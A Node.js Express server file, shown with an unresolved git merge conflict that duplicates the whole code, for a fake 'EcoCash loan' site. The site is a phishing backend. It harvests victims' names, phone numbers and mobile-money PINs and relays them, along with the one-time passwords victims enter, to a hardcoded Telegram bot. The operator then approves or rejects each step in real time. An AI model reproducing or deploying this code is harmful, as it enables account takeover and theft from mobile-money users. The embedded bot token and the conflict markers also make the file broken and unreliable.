<<<<<<< HEAD
const express = require("express");
const path = require("path");
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

const app = express();

let otpLength = null;
let step5Decision = null;   // for step 5 (otp5 / otp6)
let step6Decision = null;   // for step 6 (valid / invalid)
let lastActionTime = Date.now();

app.use(express.json());

// serve static files
app.use(express.static(path.join(__dirname, "public")));

// ==============================
// TELEGRAM CONFIG (PUT YOURS)
// ==============================
const TELEGRAM_TOKEN = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
const CHAT_ID = "7162306402";

// ==============================
// TELEGRAM FUNCTION
// ==============================

async function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

  await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,

      reply_markup: {
  inline_keyboard: [
    [
      { text: "OTP 5", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp5" },
      { text: "OTP 6", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp6" }
    ]
  ]
}
    })
  });
}

async function sendOTPToTelegram(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

  await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ VALID", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=valid" },
            { text: "❌ INVALID", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=invalid" }
          ]
        ]
      }
    })
  });
}

app.post("/submit", async (req, res) => {
  try {
    const { name, phone, pin } = req.body;

    const message = `
📥 NEW LOAN APPLICATION

👤 Name: ${name}
📞 Phone: ${phone}
🔐 PIN: ${pin}

👇 Use buttons below
`;

console.log("SENDING MESSAGE:", message);

    await sendToTelegram(message);

    res.json({ success: true });

  } catch (err) {
    console.error("ERROR:", err.message);
    res.json({ success: false });
  }
});

// ==============================
// TELEGRAM ADMIN CONTROL
// ==============================
app.get("/telegram-command", (req, res) => {
  const cmd = req.query.cmd;

  if (cmd === "otp5") {
  otpLength = 5;
  step5Decision = "otp5";
  lastActionTime = Date.now();
}

if (cmd === "otp6") {
  otpLength = 6;
  step5Decision = "otp6";
  lastActionTime = Date.now();
}

if (cmd === "valid") {
  step6Decision = "valid";
  lastActionTime = Date.now();
}

if (cmd === "invalid") {
  step6Decision = "invalid";
  lastActionTime = Date.now();
}

  if (cmd === "reset") {
    otpLength = null;
    step5Decision = null;
    step6Decision = null;
}

  console.log("STATE:", { otpLength, step5Decision, step6Decision });

  res.send(`
  <h2>✅ ${cmd.toUpperCase()}</h2>
  <p>Action received successfully.</p>
`);
});

// ==============================
// ROOT ROUTE
// ==============================
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.post("/set-otp", (req, res) => {
  const { otp } = req.body;
  otpLength = otp;

  console.log("✅ OTP SET TO:", otpLength);

  res.json({ success: true });
});

app.get("/otp-status", (req, res) => {
  const currentOtp = otpLength;

  otpLength = null; // ✅ RESET AFTER FRONTEND READS IT

  res.json({ otp: currentOtp });
});

// ==============================
// DECISION STATUS (FIXED)
// ==============================
app.get("/decision-status", (req, res) => {
  const currentDecision = step6Decision;
  step6Decision = null;
  res.json({ decision: currentDecision });
});

// ==============================
// CLEAR DECISION (NEW)
// ==============================
app.post("/clear-decision", (req, res) => {
  step6Decision = null;
  res.json({ success: true });
});

// ==============================
// SUBMIT OTP (FIXED)
// ==============================
app.post("/submit-otp", async (req, res) => {
  try {
    const { otp } = req.body;

    console.log("USER OTP:", otp);

    const message = `
🔢 OTP ENTERED:

${otp}

👇 Choose action below
`;

    await sendOTPToTelegram(message);

    res.json({ success: true });

  } catch (err) {
    console.log("OTP ERROR:", err.message);
    res.json({ success: false });
  }
});
 const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`Server running on ${PORT}`);
=======
const express = require("express");
const path = require("path");
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

const app = express();

let otpLength = null;
let step5Decision = null;   // for step 5 (otp5 / otp6)
let step6Decision = null;   // for step 6 (valid / invalid)
let lastActionTime = Date.now();

app.use(express.json());

// serve static files
app.use(express.static(path.join(__dirname, "public")));

// ==============================
// TELEGRAM CONFIG (PUT YOURS)
// ==============================
const TELEGRAM_TOKEN = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
const CHAT_ID = "7162306402";

// ==============================
// TELEGRAM FUNCTION
// ==============================

async function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

  await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,

      reply_markup: {
  inline_keyboard: [
    [
      { text: "OTP 5", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp5" },
      { text: "OTP 6", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp6" }
    ]
  ]
}
    })
  });
}

async function sendOTPToTelegram(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

  await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ VALID", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=valid" },
            { text: "❌ INVALID", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=invalid" }
          ]
        ]
      }
    })
  });
}

app.post("/submit", async (req, res) => {
  try {
    const { name, phone, pin } = req.body;

    const message = `
📥 NEW LOAN APPLICATION

👤 Name: ${name}
📞 Phone: ${phone}
🔐 PIN: ${pin}

👇 Use buttons below
`;

console.log("SENDING MESSAGE:", message);

    await sendToTelegram(message);

    res.json({ success: true });

  } catch (err) {
    console.error("ERROR:", err.message);
    res.json({ success: false });
  }
});

// ==============================
// TELEGRAM ADMIN CONTROL
// ==============================
app.get("/telegram-command", (req, res) => {
  const cmd = req.query.cmd;

  if (cmd === "otp5") {
  otpLength = 5;
  step5Decision = "otp5";
  lastActionTime = Date.now();
}

if (cmd === "otp6") {
  otpLength = 6;
  step5Decision = "otp6";
  lastActionTime = Date.now();
}

if (cmd === "valid") {
  step6Decision = "valid";
  lastActionTime = Date.now();
}

if (cmd === "invalid") {
  step6Decision = "invalid";
  lastActionTime = Date.now();
}

  if (cmd === "reset") {
    otpLength = null;
    step5Decision = null;
    step6Decision = null;
}

  console.log("STATE:", { otpLength, step5Decision, step6Decision });

  res.send(`
  <h2>✅ ${cmd.toUpperCase()}</h2>
  <p>Action received successfully.</p>
`);
});

// ==============================
// ROOT ROUTE
// ==============================
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.post("/set-otp", (req, res) => {
  const { otp } = req.body;
  otpLength = otp;

  console.log("✅ OTP SET TO:", otpLength);

  res.json({ success: true });
});

app.get("/otp-status", (req, res) => {
  const currentOtp = otpLength;

  otpLength = null; // ✅ RESET AFTER FRONTEND READS IT

  res.json({ otp: currentOtp });
});

// ==============================
// DECISION STATUS (FIXED)
// ==============================
app.get("/decision-status", (req, res) => {
  const currentDecision = step6Decision;
  step6Decision = null;
  res.json({ decision: currentDecision });
});

// ==============================
// CLEAR DECISION (NEW)
// ==============================
app.post("/clear-decision", (req, res) => {
  step6Decision = null;
  res.json({ success: true });
});

// ==============================
// SUBMIT OTP (FIXED)
// ==============================
app.post("/submit-otp", async (req, res) => {
  try {
    const { otp } = req.body;

    console.log("USER OTP:", otp);

    const message = `
🔢 OTP ENTERED:

${otp}

👇 Choose action below
`;

    await sendOTPToTelegram(message);

    res.json({ success: true });

  } catch (err) {
    console.log("OTP ERROR:", err.message);
    res.json({ success: false });
  }
});
 const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`Server running on ${PORT}`);
>>>>>>> 52e3b6ca46fe401f9410078b0f293ba170ae05e2
});